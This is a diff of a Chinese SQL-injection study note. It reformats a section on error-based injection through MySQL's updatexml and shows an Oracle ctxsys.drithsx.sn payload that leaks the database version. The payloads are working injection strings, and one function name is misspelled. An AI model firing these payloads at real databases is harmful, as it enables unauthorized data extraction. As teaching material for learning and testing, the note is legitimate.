@@ -202,18 +202,21 @@ ip的获取是有讲究的分为
 * refer
 * cookie
 
-
-### updatexml函数
+## updatexml函数
 
 updatexml()更新xml文档的函数
 
-语法：uodatexml(1,concat(0x7e,(SELECT database()),0x7e),1)
+语法：
 
-实际上这里去更新了xml文档，但是我们在xml文档路径的位置里面写入了子查询，我们输入特殊字符，然后会因为不符合输入规则然后报错
+```
+uodatexml(1,concat(0x7e,(SELECT database()),0x7e),1)
+```
+
+> 实际上这里去更新了xml文档，但是我们在xml文档路径的位置里面写入了子查询，我们输入特殊字符，然后会因为不符合输入规则然后报错
 
 但是报错的时候他其实已经执行了那个子查询代码！
 
-0x7e是16进制，MSQL支持16进制，但是开头要写0x，0x7e是一个特殊符号，然后不符合路径规则报错
+> 0x7e是16进制，MSQL支持16进制，但是开头要写0x，0x7e是一个特殊符号，然后不符合路径规则报错
 
 用法是`select updatexml(1,'!a',1)`
 
@@ -618,7 +621,6 @@ CTXSYS.DRITHSX.SN(user,(select banner from v$version where rownum=1))
 
 and 1=ctxsys.drithsx.sn(1,(select banner from sys.v$version where rownum=1))-- 查询数据库版本
 ```
-
 
 
 
